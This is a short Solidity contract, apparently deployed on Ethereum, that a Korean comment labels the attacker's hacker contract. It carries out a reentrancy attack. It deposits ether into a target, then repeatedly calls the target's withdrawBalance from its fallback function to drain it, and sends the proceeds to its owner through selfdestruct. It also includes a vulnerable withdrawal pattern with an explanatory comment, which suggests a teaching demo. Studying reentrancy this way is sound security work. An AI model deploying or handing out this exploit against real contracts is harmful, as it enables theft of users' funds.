/**
 *Submitted for verification at Etherscan.io on 2021-02-02
*/

// 공격자의 hacker 컨트랙트

pragma solidity ^0.4.25;


contract test {
    

    address owner;
    address target;
    address tokenContract;
    
    modifier onlyOwner() {
        require(owner == msg.sender);
        _;
    }

    constructor(address _target) public {
        owner = msg.sender;
        target = _target;
    }
    
    function callAddToBalance() public payable {
        target.call
           .value(msg.value)(bytes4(keccak256("addToBalance()")));
    }
    
    function launch_attack() public{
       target.call(bytes4(keccak256("withdrawBalance()")));
    }
    function () public payable {
        target.call(bytes4(keccak256("withdrawBalance()")));
    }
    
    function getMoney() public onlyOwner {
        selfdestruct(owner);
    }
    
    mapping (address => uint) private userBalances;

function transfer(address to, uint amount) {
    if (userBalances[msg.sender] >= amount) {
       userBalances[to] += amount;
       userBalances[msg.sender] -= amount;
    }
}

function withdrawBalance() public {
    uint amountToWithdraw = userBalances[msg.sender];
    (bool success, ) = msg.sender.call.value(amountToWithdraw)(""); // At this point, the caller's code is executed, and can call transfer()
    require(success);
    userBalances[msg.sender] = 0;
}
    
}